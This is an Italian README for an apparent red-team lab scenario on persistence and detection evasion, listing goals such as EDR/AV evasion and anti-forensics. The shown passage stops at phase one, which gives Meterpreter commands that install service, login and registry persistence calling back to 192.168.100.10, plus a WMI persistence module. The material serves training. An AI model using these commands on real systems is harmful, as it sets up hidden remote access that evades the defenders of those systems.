
## 📄 FILE 8: scenarios/persistence-evasion/README.md

```markdown
# 🏗️ Scenario: Persistenza ed Evasione

## 📖 Panoramica Scenario

**Difficoltà**: 🔴 Avanzato  
**Tempo Stimato**: 90-120 minuti  
**Obiettivi**: Stabilire persistenza stealth ed evadere rilevamento

### 🎯 Obiettivi di Apprendimento
- Tecniche avanzate di persistenza
- Evasione EDR/AV
- Anti-forensics
- Maintain access a lungo termine

## 🛠️ Prerequisiti

- ✅ Sessione Meterpreter attiva su multipli host
- ✅ Privilegi elevati (SYSTEM/Admin)
- ✅ Ambiente di testing con EDR/AV (opzionale)
- ✅ Conoscenza tecniche base di persistenza

## 📋 Fasi dello Scenario

### Fase 1: Persistenza Avanzata
```bash
# Multiple persistence mechanisms
meterpreter > run persistence -X -i 300 -p 443 -r 192.168.100.10    # Service
meterpreter > run persistence -U -i 600 -p 443 -r 192.168.100.10    # User Login
meterpreter > run persistence -R -i 900 -p 443 -r 192.168.100.10    # Registry

# WMI Event Subscription
meterpreter > run post/windows/manage/wmi_persistence
